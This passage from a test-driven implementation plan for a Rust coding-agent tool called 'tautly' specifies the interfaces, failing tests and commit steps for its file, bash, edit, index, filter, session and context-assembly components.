- Test: `crates/tautly-provider/tests/{google.rs,compat.rs}`

**Interfaces:**
- Produces: `struct GoogleProvider::new(api_key, base_url, catalog)`; `struct CompatProvider::new(api_key: Option<String>, base_url: Url, catalog)`.

- [ ] **Step 1: Write the failing tests:** Google — `thinking_budget_maps` (`generationConfig.thinkingConfig.thinkingBudget`), `function_call_parts_parse`, `usage_maps_cached_content_token_count`. Compat — `chat_completions_tool_calls_accumulate_by_index`, `missing_usage_is_tolerated` (no `Usage` event, no error), `no_api_key_omits_authorization_header` (Ollama), `ollama_fixture_parses`.
- [ ] **Step 2: Run** `cargo test -p tautly-provider --test google --test compat` — Expected: FAIL.
- [ ] **Step 3: Implement.** Google: `:streamGenerateContent?alt=sse`. Compat: `/chat/completions` with `stream: true`, `stream_options.include_usage: true`.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(provider): Google and OpenAI-compatible adapters"`

### Task 9: `Tool` trait and read-side tools (`read`, `write`, `grep`, `glob`)

**Files:**
- Create: `crates/tautly-tools/{Cargo.toml,clippy.toml}`, `crates/tautly-tools/src/{lib.rs,spec.rs,read.rs,write.rs,grep.rs,glob.rs}`
- Test: `crates/tautly-tools/tests/read_side.rs`

**Interfaces:**
- Consumes: `Sandbox`, `Effect`, `Capabilities`, `EditFormat`, `ToolSpec`.
- Produces:
  - `#[async_trait] trait Tool: Send + Sync { fn name(&self) -> &'static str; fn spec(&self, caps: &Capabilities) -> ToolSpec; fn effect(&self, args: &Value) -> Result<Effect, ToolError>; async fn run(&self, args: Value, sb: &dyn Sandbox, cx: &ToolCx) -> ToolResult; }`
  - `struct ToolCx { edit_format: EditFormat, reads: Arc<ReadTracker>, spill_dir: PathBuf, cancel: CancellationToken, output_tx: Option<mpsc::Sender<String>> }`
  - `struct ReadTracker` with `fn record(&self, path: &Path, meta: &FileMeta, hash: blake3::Hash)` and `fn last(&self, path: &Path) -> Option<(SystemTime, blake3::Hash)>`
  - `struct ToolResult { output: String, is_error: bool, effects: Vec<AppliedEffect> }`; `enum AppliedEffect { Read(PathBuf, blake3::Hash), Edited { path: PathBuf, pre_image: Option<Vec<u8>>, post_hash: blake3::Hash } }`
  - `fn registry(caps: &Capabilities) -> Vec<Arc<dyn Tool>>` (fixed order: read, edit, write, bash, grep, glob, web_fetch, pin, state)

- [ ] **Step 1: Write the failing tests**

```rust
#[tokio::test] async fn read_line_range_numbers_lines() { /* lines 2..=3 of "a\nb\nc\nd" → "2\tb\n3\tc" and records tracker */ }
#[tokio::test] async fn read_emits_hashline_anchors_when_format_is_hashline() { /* each line prefixed "<n>:<4-hex>|" */ }
#[tokio::test] async fn read_binary_file_is_error() { let r = run_read("bin.dat" /* contains NUL */).await; assert!(r.is_error && r.output.contains("binary")); }
#[tokio::test] async fn read_non_utf8_is_error() { /* 0xFF 0xFE latin-1 bytes → is_error, "not UTF-8" */ }
#[tokio::test] async fn write_effect_lists_path() { assert_eq!(WriteTool.effect(&json!({"path":"a.txt","content":"x"})).unwrap(), Effect::Write{paths: vec!["a.txt".into()]}); }
#[tokio::test] async fn write_records_pre_image_of_existing_file() {}
#[tokio::test] async fn grep_respects_gitignore() { /* match in ignored target/ not returned */ }
#[tokio::test] async fn glob_returns_sorted_relative_paths_and_terminates_on_symlink_cycle() {}
```

- [ ] **Step 2: Run** `cargo test -p tautly-tools --test read_side` — Expected: FAIL.
- [ ] **Step 3: Implement.** `clippy.toml` in `tautly-tools` sets `disallowed-methods = ["std::fs::read", "std::fs::write", "std::fs::read_to_string", "std::fs::File::open", "std::fs::File::create", "tokio::fs::read", "tokio::fs::write"]` and `disallowed-types = ["std::process::Command", "tokio::process::Command"]`. Hash anchor = first 4 hex chars of blake3 of the line. Grep output: one line per match `path:line:text`, capped at 30 KB (head kept) — Task 10 later swaps in the shared `cap_output`. In this task `registry` returns only the tools that exist (read, write, grep, glob) in their final relative order; Tasks 10, 13, 15 and 22 insert the rest.
- [ ] **Step 4: Run** `cargo test -p tautly-tools --test read_side && cargo clippy -p tautly-tools -- -D warnings` — Expected: PASS, no clippy errors.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): Tool trait, read/write/grep/glob, fs lint"`

### Task 10: `bash` tool

**Files:**
- Create: `crates/tautly-tools/src/bash.rs` (also exports `pub fn cap_output(full: &str, cap: usize, spill_dir: &Path) -> (String, Option<PathBuf>)`)
- Test: `crates/tautly-tools/tests/bash.rs`

**Interfaces:**
- Produces: `BashTool` (`effect` → `Effect::Exec{argv}` from first parsed command; raw command passed to policy separately by the engine via `args["command"]`).

- [ ] **Step 1: Write the failing tests**

```rust
#[tokio::test] async fn captures_stdout_stderr_and_exit_code() { /* "echo out; echo err >&2; exit 3" → contains out, err, "exit code: 3", is_error */ }
#[tokio::test] async fn output_over_30kb_keeps_head_and_tail_and_spills() {
    let r = run_bash("seq 1 100000").await;
    assert!(r.output.len() <= 31 * 1024); assert!(r.output.starts_with("1\n")); assert!(r.output.contains("100000"));
    assert!(r.output.contains("full output saved to"));
}
#[tokio::test(start_paused = false)] async fn timeout_kills_process_group() { /* "sleep 300 & sleep 300" with timeout 1s → is_error "timed out"; no `sleep 300` processes remain (pgrep) */ }
#[tokio::test] async fn cancel_kills_within_200ms() { /* cancel token at 50ms; run returns < 250ms total; no children */ }
#[tokio::test] async fn streams_output_deltas() { /* output_tx receives lines before completion */ }
```

- [ ] **Step 2: Run** `cargo test -p tautly-tools --test bash` — Expected: FAIL.
- [ ] **Step 3: Implement.** Spawn `["/bin/sh","-c",cmd]` via `Sandbox::spawn` with `new_process_group: true`; on timeout/cancel `killpg(SIGTERM)`, wait 100 ms, `killpg(SIGKILL)`. Default timeout 120 s, overridable by `args["timeout_s"]` up to 600.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): bash tool with caps, timeout, process-group kill"`

### Task 11: `edit` tool — `str_replace`, stale guard, atomic write

**Files:**
- Create: `crates/tautly-tools/src/edit/{mod.rs,guard.rs,atomic.rs,str_replace.rs}`
- Test: `crates/tautly-tools/tests/edit_str_replace.rs`

**Interfaces:**
- Consumes: `ReadTracker`, `Sandbox::write_atomic`.
- Produces: `EditTool` whose `spec()` schema depends on `caps.edit_format`; `fn guard::check_fresh(tracker: &ReadTracker, path: &Path, meta: &FileMeta, current: &[u8]) -> Result<(), EditError>`; `fn atomic::preserve_and_write(sb: &dyn Sandbox, path: &Path, original: &[u8], new_text: &str) -> Result<(), EditError>` (restores CRLF, BOM, trailing-newline state, mode); `fn str_replace::apply(text: &str, old: &str, new: &str) -> Result<String, MatchError>`; `enum MatchError { NotFound { candidates: Vec<usize> }, Ambiguous { lines: Vec<usize> } }`.

- [ ] **Step 1: Write the failing tests**

```rust
#[tokio::test] async fn rejects_edit_without_prior_read() { assert!(edit("a.rs","x","y").await.output.contains("read the file first")); }
#[tokio::test] async fn rejects_edit_when_file_changed_since_read() { /* read, external write, edit → is_error "changed since last read" */ }
#[test] fn exact_match_replaces() { assert_eq!(apply("a\nfoo\nb", "foo", "bar").unwrap(), "a\nbar\nb"); }
#[test] fn ambiguous_exact_match_fails_with_lines() { assert_eq!(apply("x\nx", "x", "y"), Err(MatchError::Ambiguous{lines: vec![1,2]})); }
#[test] fn whitespace_fallback_only_when_unique() {
    assert_eq!(apply("fn a() {\n    b();\n}", "fn a() {\n  b();\n}", "fn a() {}").unwrap(), "fn a() {}");
}
#[test] fn not_found_reports_candidates() { assert!(matches!(apply("alpha\nbeta", "betx", "z"), Err(MatchError::NotFound{..}))); }
#[tokio::test] async fn preserves_crlf_bom_no_trailing_newline_and_mode() { /* file "\u{FEFF}a\r\nb" mode 0755 → after edit still BOM, CRLF, no final newline, 0755 */ }
#[tokio::test] async fn edit_on_binary_file_is_error() {}
#[tokio::test] async fn result_carries_pre_image() { /* AppliedEffect::Edited.pre_image == original bytes */ }
proptest! { #[test] fn apply_then_inverse_restores(text in "[a-z\\n]{1,200}", ...) { /* unique old → apply(new) then apply(new→old) == text */ } }
```

- [ ] **Step 2: Run** `cargo test -p tautly-tools --test edit_str_replace` — Expected: FAIL.
- [ ] **Step 3: Implement.** Normalize to LF internally; whitespace fallback compares lines with leading/trailing whitespace trimmed and requires exactly one window match. After a successful edit, update the tracker with the new hash so consecutive edits don't require re-reads.
- [ ] **Step 3b: Tolerant applier stages 1–4 (spec 7.9)** in `crates/tautly-tools/src/edit/tolerant.rs`: `fn tolerant::locate(text: &str, old: &str) -> Result<Located, MatchError>` with `struct Located { range: std::ops::Range<usize>, stage: RepairStage, reindent: Option<isize> }` and `enum RepairStage { Exact, Normalized, Whitespace, Indentation, Anchor, Structural }`; `MatchError::NotFound` gains `nearest: Option<(usize, String)>` (start line, ≤ 20 numbered lines). Tests (write first, see RED): `normalizes_smart_quotes_crlf_and_trailing_ws`, `strips_copied_line_numbers_and_hashline_anchors`, `indentation_relative_match_reindents_replacement`, `anchor_match_requires_unique_first_last_and_0_9_interior`, `ambiguous_tolerant_match_is_error`, `not_found_includes_nearest_window_max_20_lines`, `result_names_repair_stage`. The `patch` format (Task 12) reuses `locate` stages 1–4 for hunk context.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): str_replace edit with stale guard and atomic write"`

### Task 12: `patch` and `hashline` edit formats

**Files:**
- Create: `crates/tautly-tools/src/edit/{patch.rs,hashline.rs}`; modify `edit/mod.rs`
- Test: `crates/tautly-tools/tests/edit_formats.rs`

**Interfaces:**
- Produces: `fn patch::apply(files: &dyn Fn(&Path) -> Option<String>, patch: &str) -> Result<Vec<(PathBuf, PatchOp)>, PatchError>` with `enum PatchOp { Update(String), Add(String), Delete }`; `fn hashline::apply(text: &str, ops: &[HashlineOp]) -> Result<String, HashlineError>` with `enum HashlineOp { Replace { start: Anchor, end: Anchor, lines: Vec<String> }, InsertAfter { at: Anchor, lines: Vec<String> }, Delete { start: Anchor, end: Anchor } }`, `struct Anchor { line: usize, hash: String }`.

- [ ] **Step 1: Write the failing tests:** `patch_update_with_context_applies`, `patch_add_and_delete_file`, `patch_context_mismatch_errors_with_hunk_index`, `patch_multi_file_is_all_or_nothing` (second hunk fails → no file written), `hashline_replace_range`, `hashline_stale_anchor_hash_errors` (hash mismatch → `HashlineError::Stale{line}`), `hashline_insert_after_last_line`, `edit_tool_schema_switches_with_format` (`spec(caps(Patch)).schema` has `"patch"` property; `Hashline` has `"ops"`).
- [ ] **Step 2: Run** `cargo test -p tautly-tools --test edit_formats` — Expected: FAIL.
- [ ] **Step 3: Implement.** Patch grammar = Codex apply-patch envelope (`*** Begin Patch` / `*** Update File:` / `@@` / `*** End Patch`); also accept unified diff. Each touched file goes through the same stale guard and atomic write as Task 11; validate all hunks before writing any file.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): patch and hashline edit formats"`

### Task 13: Post-edit syntax check, `web_fetch`, `pin`/`state` tool shells

**Files:**
- Create: `crates/tautly-tools/src/edit/syntax.rs`, `crates/tautly-tools/src/{web_fetch.rs,pin_state.rs}`
- Test: `crates/tautly-tools/tests/{syntax.rs,web_fetch.rs,pin_state.rs}`

**Interfaces:**
- Produces: `fn syntax::new_errors(path: &Path, before: &str, after: &str) -> Option<Vec<(usize, String)>>` (None = unsupported language); `WebFetchTool`; `PinTool`, `StateTool` whose `run` returns `ToolResult` with `effects` empty and a JSON body; the engine (Task 24) intercepts their parsed args as `ContextOp::{Pin(String), StateUpdate(StatePatch)}` — define `enum ContextOp` here and `fn parse_context_op(tool: &str, args: &Value) -> Option<ContextOp>`.

- [ ] **Step 1: Write the failing tests:** `introduced_parse_error_reported` (Rust file, remove closing brace → `Some(vec![(line, msg)])`); `preexisting_error_not_reported`; `unsupported_extension_returns_none` (`.xyz`); supported set exactly rs, ts, tsx, js, py, go, json, toml, yaml/yml; `edit_result_includes_syntax_warning_and_keeps_edit`; `web_fetch_converts_html_to_markdown` (wiremock); `web_fetch_caps_output`; `pin_parses_context_op`; `state_rejects_unknown_fields`; `registry_order_is_stable` (`names(registry(&caps())) == ["read","edit","write","bash","grep","glob","web_fetch","pin","state"]`; Tasks 15 and 22 extend this assertion).
- [ ] **Step 2: Run** `cargo test -p tautly-tools` — Expected: FAIL on new tests.
- [ ] **Step 3: Implement.** Count `ERROR`/`MISSING` nodes before and after; report nodes whose line is not in the "before" set. `StatePatch { plan: Option<Vec<PlanStep>>, decisions_add: Vec<String>, questions_add: Vec<String>, questions_resolve: Vec<usize> }`, `PlanStep { text: String, status: StepStatus }`, `enum StepStatus { Pending, InProgress, Done }`.
- [ ] **Step 4: Run** `cargo test -p tautly-tools` — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): syntax check, web_fetch, pin/state tools"`

### Task 14: Code index (`tautly-index`)

**Files:**
- Create: `crates/tautly-index/src/{lib.rs,extract.rs,store.rs,update.rs}`, `crates/tautly-index/queries/{rust,typescript,javascript,python,go}.scm`
- Test: `crates/tautly-index/tests/index.rs`

**Interfaces:**
- Consumes: `Sandbox` (Task 1); language detection shared with `syntax.rs` (Task 13) — move the extension→language map to `tautly-index::Lang` and have `syntax.rs` use it.
- Produces:
  - `enum Lang { Rust, TypeScript, Tsx, JavaScript, Python, Go, Json, Toml, Yaml }` with `fn Lang::from_path(p: &Path) -> Option<Lang>`
  - `enum SymbolKind { Function, Method, Type, Constant, Module }`
  - `struct SymbolRow { path: PathBuf, name: String, kind: SymbolKind, parent: Option<String>, start_line: u32, end_line: u32, signature: String, hash: String }`; `struct RefRow { path: PathBuf, line: u32, context: String }`
  - `struct Index` with `fn open(db: &Path, sb: Arc<dyn Sandbox>) -> Result<Index, IndexError>`, `async fn refresh(&self) -> Result<RefreshStats, IndexError>`, `fn spawn_background_refresh(self: Arc<Self>) -> JoinHandle<()>`, `fn is_ready(&self) -> bool`, `async fn reindex_file(&self, rel: &Path) -> Result<(), IndexError>`, `fn outline(&self, rel: &Path) -> Result<Vec<SymbolRow>, IndexError>`, `fn find_symbol(&self, name: &str, kind: Option<SymbolKind>) -> Result<Vec<SymbolRow>, IndexError>`, `fn refs(&self, name: &str, limit: usize) -> Result<Vec<RefRow>, IndexError>`, `fn file_hash(&self, rel: &Path) -> Option<String>`, `fn symbol_hash(&self, rel: &Path, name: &str) -> Option<String>`, `fn stats(&self) -> IndexStats`
  - `struct RefreshStats { parsed: u32, removed: u32, unchanged: u32 }`; `struct IndexStats { files: u64, symbols: u64, refs: u64 }`
  - `fn extract::extract(lang: Lang, src: &str) -> Extracted` with `struct Extracted { symbols: Vec<SymbolRow /* path empty */>, refs: Vec<(u32, String)> }`

- [ ] **Step 1: Write the failing tests**

```rust
#[test] fn extracts_rust_items_with_parents() {
    let e = extract(Lang::Rust, "struct A;\nimpl A {\n    fn go(&self) -> u8 { 1 }\n}\nconst N: u8 = 3;\nfn main() {}\n");
    assert_eq!(names_kinds(&e), [("A",Type),("go",Method),("N",Constant),("main",Function)]);
    assert_eq!(e.symbols[1].parent.as_deref(), Some("A"));
    assert_eq!(e.symbols[1].signature, "fn go(&self) -> u8");
}
#[test] fn extracts_python_ts_go_definitions() { /* one def/class/func per language → expected names and kinds */ }
#[test] fn refs_exclude_definition_sites() {}
#[test] fn symbol_hash_changes_only_when_that_symbol_changes() {}
#[tokio::test] async fn refresh_reparses_only_changed_files() {
    let (t, idx) = index_with(&[("a.rs","fn a(){}"),("b.rs","fn b(){}")]); idx.refresh().await.unwrap();
    touch_write(t.path().join("a.rs"), "fn a2(){}");
    assert_eq!(idx.refresh().await.unwrap(), RefreshStats{parsed:1, removed:0, unchanged:1});
}
#[tokio::test] async fn deleted_files_are_removed() {}
#[tokio::test] async fn gitignored_files_skipped() {}
#[tokio::test] async fn reindex_file_updates_outline() {}
#[tokio::test] async fn two_handles_share_db_in_wal_mode() {}
#[tokio::test] async fn is_ready_false_until_first_refresh_completes() {}
```

- [ ] **Step 2: Run** `cargo test -p tautly-index` — Expected: FAIL.
- [ ] **Step 3: Implement.** Queries capture `@definition.<kind>` / `@name` (start from each grammar's `tags.scm` where shipped). Signature = source from the definition start up to (excluding) the body node, whitespace-collapsed, ≤ 200 chars. Symbol hash = blake3 of the definition's source text. Initial build parses with `rayon` inside `spawn_blocking`; writes in one transaction per 500 files. Skip files > 1 MB and non-UTF-8 files.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(index): incremental tree-sitter symbol index"`

### Task 15: `outline`, `symbol`, `refs` tools

**Files:**
- Create: `crates/tautly-tools/src/index_tools.rs`; modify `lib.rs` (`ToolCx` gains `index: Option<Arc<Index>>` and `turn: u32`), `edit/mod.rs` (call `index.reindex_file` after each successful write), `registry`
- Test: `crates/tautly-tools/tests/index_tools.rs`

**Interfaces:**
- Consumes: `Index` (Task 14).
- Produces: `OutlineTool`, `SymbolTool`, `RefsTool` (all `Effect::ReadOnly`). Registry order becomes `read, edit, write, bash, grep, glob, outline, symbol, refs, web_fetch, pin, state`.

- [ ] **Step 0: Structural edit fallback (spec 7.9 stage 5)** in `crates/tautly-tools/src/edit/tolerant.rs`: when stages 1–4 fail for `str_replace` and the old text starts with a definition `extract` can name, locate that symbol in the file via `Index::outline` (or on-demand extract) and use its range if similarity ≥ 0.8; after writing, if `syntax::new_errors` is non-empty, restore the pre-image and fail. Tests: `structural_fallback_replaces_symbol_body_when_similar`, `structural_fallback_rejected_below_0_8`, `structural_fallback_reverts_on_new_parse_error`.
- [ ] **Step 1: Write the failing tests:** `outline_lists_signatures_and_ranges_without_bodies`; `symbol_returns_source_with_path_and_lines`; `symbol_with_multiple_matches_lists_locations_only`; `symbol_kind_filter_narrows`; `refs_lists_path_line_context_and_respects_limit` (default limit 50); `refs_description_says_name_based`; `fallback_while_index_not_ready` (outline still works via on-demand parse and the output starts with `(index building)`; symbol falls back to grep); `edit_then_symbol_sees_new_body`; `registry_order_is_stable` updated to the order above.
- [ ] **Step 2: Run** `cargo test -p tautly-tools --test index_tools` — Expected: FAIL.
- [ ] **Step 3: Implement.** Output formats: outline `L<start>-<end> <kind> <signature>` per line, indented under parent; refs `path:line: context`.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): outline, symbol, refs index tools"`

### Task 16: Output filters

**Files:**
- Create: `crates/tautly-tools/src/filters/{mod.rs,cargo.rs,pytest.rs,jest.rs,gotest.rs,tsc.rs,eslint.rs}`, fixtures `crates/tautly-tools/tests/fixtures/filters/{cargo_test_fail,cargo_build_err,clippy_warn,pytest_fail,jest_fail,vitest_fail,gotest_fail,tsc_err,eslint_err}.txt` (captured from real tool runs); modify `bash.rs`
- Test: `crates/tautly-tools/tests/filters.rs`

**Interfaces:**
- Consumes: `SimpleCommand`, `parse_commands` (Task 2); `cap_output` (Task 10).
- Produces: `enum FilterKind { Cargo, Pytest, Jest, GoTest, Tsc, Eslint }`; `fn filters::detect(cmds: &[SimpleCommand]) -> Option<FilterKind>` (last command of a pipeline/list that matches); `fn filters::apply(kind: FilterKind, output: &str) -> Option<Summary>`; `struct Summary { passed: Option<u32>, failed: u32, errors: u32, warnings: u32, items: Vec<Item> }`; `struct Item { name: String, location: Option<String>, message: String, detail: Vec<String> }`; `fn Summary::render(&self, spill: &Path) -> String`.

- [ ] **Step 1: Write the failing tests:** `detects_common_invocations` (`cargo test -p x`, `cargo clippy`, `python -m pytest -q`, `pytest`, `npx jest`, `pnpm vitest run`, `go test ./...`, `npx tsc --noEmit`, `eslint .`, `npm run lint` → None); one `parses_<fixture>` test per fixture asserting counts and the first item's `name`/`location`; `detail_capped_at_20_lines`; `output_under_2kb_not_filtered`; `unparseable_output_falls_back_to_head_tail_cap`; `raw_true_disables_filtering`; `render_includes_spill_path_and_counts`.
- [ ] **Step 2: Run** `cargo test -p tautly-tools --test filters` — Expected: FAIL.
- [ ] **Step 3: Implement.** Prefer machine-readable markers in the text output (cargo `error[E…]`/`--> file:line`, pytest `FAILED path::name`, go `--- FAIL:`, tsc `file(line,col): error TS…`, eslint stylish blocks, jest/vitest `●` blocks). Bash: if `detect` matches and raw output > 2 KB and `!args.raw`, use `Summary::render`; else `cap_output`.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): output filters for common test and build tools"`

### Task 17: Diff-on-re-read

**Files:**
- Modify: `crates/tautly-tools/src/{lib.rs,read.rs}`
- Test: `crates/tautly-tools/tests/reread.rs`

**Interfaces:**
- Consumes: `ReadTracker` (Task 9), `ToolCx.turn` (Task 15).
- Produces: `ReadTracker::record(&self, path: &Path, range: LineRange, meta: &FileMeta, hash: blake3::Hash, turn: u32, content: &str)` storing content on disk at `<spill_dir>/reads/<hash>` (tracker keeps only path → (range, hash, turn, mtime) in memory); `fn ReadTracker::previous(&self, path: &Path, range: LineRange) -> Option<PrevRead>`; `struct PrevRead { hash: blake3::Hash, turn: u32, content_path: PathBuf }`; `read` arg `full: bool` (default false).

- [ ] **Step 1: Write the failing tests:** `identical_reread_returns_unchanged_since_turn` (output == `unchanged since turn 3`); `small_change_returns_line_numbered_unified_diff` (1 of 10 lines changed → output starts with `changed since turn 3:` and contains `@@`); `change_of_half_or_more_returns_full`; `full_true_forces_full_content`; `different_range_is_not_a_reread`; `tracker_keeps_contents_on_disk_not_in_memory` (file exists under `reads/`); `edit_updates_tracker_so_reread_after_own_edit_is_diffed_against_post_edit`.
- [ ] **Step 2: Run** `cargo test -p tautly-tools --test reread` — Expected: FAIL.
- [ ] **Step 3: Implement** with the `similar` crate (line diff, 2 lines of context, new-file line numbers).
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): diff-on-re-read"`

### Task 18: Session store

**Files:**
- Create: `crates/tautly-session/src/{lib.rs,record.rs,writer.rs,reader.rs,blobs.rs,paths.rs}`
- Test: `crates/tautly-session/tests/session.rs`

**Interfaces:**
- Produces:
  - `fn paths::data_home() -> PathBuf` (TAUTLY_HOME → XDG_DATA_HOME → ~/.local/share, + `/tautly`); `fn paths::project_hash(root: &Path) -> String` (blake3 of canonical path, 16 hex)
  - `struct Header { schema_version: u32 /* 1 */, session_id: String, created: SystemTime, root: PathBuf, parent: Option<(String, u64)> }`
  - `struct SessionWriter<R: Serialize>`: `fn create(root: &Path, parent: Option<(String,u64)>) -> Result<Self>`, `fn append(&mut self, rec: &R) -> Result<u64 /* offset */>`, `fn checkpoint(&mut self) -> Result<()>` (fsync), `fn blob(&self, bytes: &[u8]) -> Result<BlobRef>`
  - `struct BlobRef(String)` (blake3 hex; stored at `blobs/<first2>/<rest>`; written only if absent)
  - `struct SessionReader<R: DeserializeOwned>`: `fn open(path: &Path) -> Result<Self>`, `fn header(&self) -> &Header`, `fn records(&self) -> impl Iterator<Item = Result<(u64, R)>>` (a truncated final line is skipped and reported via `fn truncated_tail(&self) -> bool`), `fn read_blob(&self, r: &BlobRef) -> Result<Vec<u8>>`
  - `fn list(root: &Path) -> Result<Vec<SessionSummary>>`; `struct SessionSummary { id: String, created: SystemTime, path: PathBuf, last_modified: SystemTime }`

- [ ] **Step 1: Write the failing tests:** `append_and_read_back_in_order`; `header_has_schema_version_1`; `truncated_last_line_is_skipped_and_flagged` (write half a line manually); `blobs_deduplicate` (same bytes twice → one file); `fork_header_references_parent_offset`; `list_sorted_newest_first`; `two_writers_same_project_do_not_collide` (two sessions in parallel threads → two files, both readable).
- [ ] **Step 2: Run** `cargo test -p tautly-session` — Expected: FAIL.
- [ ] **Step 3: Implement.** Session id = ULID. `BufWriter` with explicit `flush` + `sync_data` on `checkpoint`.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(session): append-only JSONL store with blobs and fork"`

### Task 19: Context blocks, token accounting, pinned items, working state

**Task 19 review amendment (binding):** the working state renders as a tail block after the last message (spec 6.1), not before history; the last-message cache breakpoint goes on the last history message, before the state tail. Pinned stays as the first user-role content after the stable prefix.

**Checkpoint 2 amendments (binding):** Use the new effect shapes from the checkpoint-2 fix wave: `AppliedEffect::{Read{path,range,file_hash,shown}, Edited{path,pre_image,pre_mode,post_hash}, Deleted{path,pre_image,pre_mode}, Exec{may_write}}`; the files list is keyed by the resolved effect path (displayed root-relative); `Deleted` removes the file note's `edited` state and marks it deleted.

**Files:**
- Create: `crates/tautly-context/src/{lib.rs,blocks.rs,tokens.rs,pinned.rs,state.rs,agents_md.rs,assemble.rs,prompt.rs}`, `crates/tautly-context/prompts/system.md`
- Test: `crates/tautly-context/tests/assemble.rs`

**Interfaces:**
- Consumes: Task 4 canonical types; `ContextOp`, `StatePatch` (Task 13); `AppliedEffect` (Task 9).
- Produces:
  - `struct Context { pinned: Vec<Pinned>, state: WorkingState, history: Vec<Turn>, agents_md: Option<String>, memory_index: Option<String>, tokens: TokenEstimator, first_turn, repo_map, root, results, clock, session_pins: Vec<Pinned>, load_warnings: Vec<String> }` (`memory_index` is set by the engine in Task 28 and rendered in the stable block after AGENTS.md; `session_pins` render in the state tail until `fold_session_pins`)
  - `struct Pinned { text: String, source: PinSource }`; `enum PinSource { User, Config, Model, AgentsMd }`
  - `struct WorkingState { task: Option<String>, plan: Vec<PlanStep>, files: BTreeMap<PathBuf, FileNote>, decisions: Vec<String>, questions: Vec<String>, failed_attempts: Vec<String> /* ≤ 10, rendered ≤ 300 tokens; set by the engine (Task 24) */ }`; `struct FileNote { read_hash: Option<String>, edited: bool, deleted: bool, maybe_stale: bool, last_turn: u32 }`
  - `struct Turn { messages: Vec<Message> }`
  - `fn Context::apply_effects(&mut self, effects: &[AppliedEffect], turn: u32)`; `fn Context::apply_op(&mut self, op: ContextOp) -> Result<(), PinError>`; `fn Context::pin(&mut self, text: impl Into<String>, source: PinSource) -> Result<bool, PinError>` (a mid-session pin goes to `session_pins`; text ≤ 2 KB, ≤ 20 session pins); `fn Context::fold_session_pins(&mut self) -> bool` (moves them into `pinned`; call only when a cache epoch is applied anyway)
  - `fn Context::assemble(&self, caps: &Capabilities, tools: &[ToolSpec], model: &ModelId) -> (CanonicalRequest, ContextStatus)`
  - `struct ContextStatus { used: u32, budget: u32, breakdown: Breakdown, warnings: Vec<String>, flat_tokens: u32 /* images etc. in the measured request */, cached_prefix: u32 /* tokens up to the last breakpoint */ }`; `struct Breakdown { system: u32, tools: u32, agents_md: u32, memory: u32, repo_map: u32 /* Task 38 */, pinned: u32, state: u32, history: u32 }`
  - `struct TokenEstimator` with `fn estimate(&self, s: &str) -> u32` (`ceil(bytes / 4 * ratio)`) and `fn calibrate(&mut self, estimated: u32, actual: u64)` (ratio = EMA of actual/estimated, clamped 0.5–2.0); the engine uses `fn Context::calibrate(&mut self, status: &ContextStatus, usage: &RawUsage)`, which sums `input + cache_read + cache_write` and subtracts `status.flat_tokens`
  - `fn agents_md::load(sb: &dyn Sandbox) -> AgentsMd { text: Option<String>, pins: Vec<Pinned>, warnings: Vec<String> }` (applied with `Context::set_agents_md`) — concatenates AGENTS.md from root up to filesystem root (nearest last), read through the sandbox resolver (regular files only; 32 KB per file / 64 KB total with markers and warnings; an ancestor's link target must stay inside the directory holding it); sections whose heading text is `Constraints` or `Rules` (any level, case-insensitive) become `Pinned{source: AgentsMd}` (≤ 2 KB each, 4 KB total)
  - `fn prompt::system() -> &'static str` (`include_str!("../prompts/system.md")`)

- [ ] **Step 1: Write the failing tests**

```rust
#[test] fn block_order_is_system_tools_agents_memory_pinned_history_state() { /* stable system blocks, then pinned as first user content, history, and the state tail last */ }
#[test] fn stable_prefix_is_byte_identical_across_turns() {
    let mut c = ctx(); let (a, _) = c.assemble(&caps(), &tools(), &m()); c.history.push(turn("hi")); c.apply_op(ContextOp::Pin("x".into()));
    let (b, _) = c.assemble(&caps(), &tools(), &m());
    assert_eq!(serde_json::to_vec(&a.system[..STABLE_LEN]).unwrap(), serde_json::to_vec(&b.system[..STABLE_LEN]).unwrap());
}
#[test] fn cache_breakpoints_after_stable_prefix_and_last_message() {}
#[test] fn system_prompt_under_2000_tokens() { assert!(TokenEstimator::default().estimate(prompt::system()) < 2000); }
#[test] fn breakdown_sums_to_used() {}
#[test] fn pinned_over_10_percent_warns() {}
#[test] fn files_list_comes_from_effects_not_model() { /* apply Edited effect → files[path].edited == true */ }
#[test] fn agents_md_rules_section_autopinned() { /* "## Rules\n- never touch migrations/" → one AgentsMd pin */ }
#[test] fn calibrate_moves_ratio_toward_actual() {}
```

- [ ] **Step 2: Run** `cargo test -p tautly-context --test assemble` — Expected: FAIL.
- [ ] **Step 3: Implement.** Pinned and state render as tagged text blocks (`<pinned>…</pinned>`, `<working_state>…</working_state>`); pinned is the first user-role content after the system prefix, the state is a tail message after the last history message (spec 6.1), so the cached prefix stays stable. Write `system.md` (role, tool-use rules, safety rules); it contains no per-model or per-turn text. Edit-format guidance lives in the `edit` tool's description, which already varies by `caps.edit_format`.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(context): block assembly, token accounting, pinned, working state"`

### Task 20: Compaction

**Checkpoint 2 amendments (binding):** Compaction must call `ReadTracker::forget_shown_at(cut_turn)` (or `clear()`) so no `unchanged since turn N` answer refers to a compacted turn.

